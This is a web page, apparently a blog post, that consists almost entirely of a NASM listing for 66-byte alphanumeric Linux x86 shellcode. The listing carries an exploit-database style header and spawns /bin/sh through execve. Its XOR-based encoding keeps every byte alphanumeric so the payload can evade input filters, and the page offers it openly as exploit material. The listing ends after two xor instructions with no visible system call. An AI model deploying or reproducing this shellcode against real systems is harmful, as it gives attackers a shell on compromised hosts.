---
permalink: /linux_execve_alphanum/
layout: single
classes: wide

--- 

```nasm
; Exploit Title: Linux x86 - Alphanumeric Execve() (66 bytes)
; Date: 2019-12-31
; Author: bolonobolo
; Vendor Homepage: None
; Software Link: None
; Tested on: Ubuntu Linux x86
; Comments: execve()
; CVE: N/A

global _start           

section .text
_start:

       ; int 0x80 ------------
       push 0x30
       pop eax
       xor al, 0x30
       push eax
       pop edx
       dec eax
       xor ax, 0x4f73
       xor ax, 0x3041
       push eax
       push edx
       pop eax
       ;----------------------
       push edx
       push 0x68735858
       pop eax
       xor ax, 0x7777
       push eax
       push 0x30
       pop eax
       xor al, 0x30
       xor eax, 0x6e696230
       dec eax
       push eax

       ; pushad/popad to place /bin/sh in EBX register
       push esp
       pop eax
       push edx
       push ecx
       push ebx
       push eax
       push esp
       push ebp
       push esi
       push edi
       popad
       push eax
       pop ecx
       push ebx

       xor al, 0x4a
       xor al, 0x41
```